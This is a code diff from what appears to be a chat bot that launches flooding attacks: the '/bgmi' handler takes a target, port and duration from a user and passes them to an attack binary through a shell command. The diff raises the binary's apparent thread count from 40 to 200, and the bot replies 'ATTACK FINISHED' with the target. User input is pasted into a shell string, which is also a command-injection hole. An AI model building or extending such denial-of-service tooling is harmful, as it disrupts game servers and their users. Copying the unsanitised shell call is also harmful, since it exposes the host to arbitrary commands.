@@ -467,7 +467,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # @YBD OFFICIAL GRP # Call start_attack_reply function
-                full_command = f"./antiban {target} {port} {time} 40"
+                full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝓨𝘉𝘋 ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══"
         else:
